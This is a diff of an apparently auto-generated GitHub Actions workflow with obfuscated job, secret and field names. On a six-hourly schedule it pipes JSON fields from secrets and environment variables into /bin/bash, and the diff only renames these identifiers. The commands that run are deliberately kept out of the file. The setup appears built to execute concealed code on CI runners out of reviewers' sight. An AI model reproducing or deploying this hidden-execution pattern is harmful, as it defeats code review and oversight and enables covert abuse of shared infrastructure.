@@ -1,23 +1,26 @@
 name: wuhaoning3214
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '8 3/6 * * *'
+    - cron: '35 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: wuhaoning3214
         env:
-          xxkzv9: ${{ secrets.xxkzv9 }}
+          fvey081: ${{ secrets.fvey081 }}
         run: |
-          echo $xxkzv9 | jq -r .ucy453 | /bin/bash
-          echo $mi05030 | jq -r .oymms65 | /bin/bash
-          echo $o4 | jq -r .xaqrq61 | /bin/bash
-          echo $h4 | jq -r .urzq36 | /bin/bash
-          echo $ug5112 | jq -r .jerkq2 | /bin/bash
-          echo $xtx19050 | jq -r .a21 | /bin/bash
-          echo $o76 | jq -r .rfp75862 | /bin/bash
-          echo $htokx51157 | jq -r .qr5 | /bin/bash
+          echo $fvey081 | jq -r .s02 | /bin/bash
+          echo $mfhf26118 | jq -r .co979 | /bin/bash
+          echo $so14 | jq -r .ozyxn7637 | /bin/bash
+          echo $jaxt629 | jq -r .ecsf8 | /bin/bash
+          echo $q0 | jq -r .b32880 | /bin/bash
+          echo $qcj9 | jq -r .syb171 | /bin/bash
+          echo $nuea59722 | jq -r .slfyq352 | /bin/bash
+          echo $p3728 | jq -r .qurt2433 | /bin/bash
 
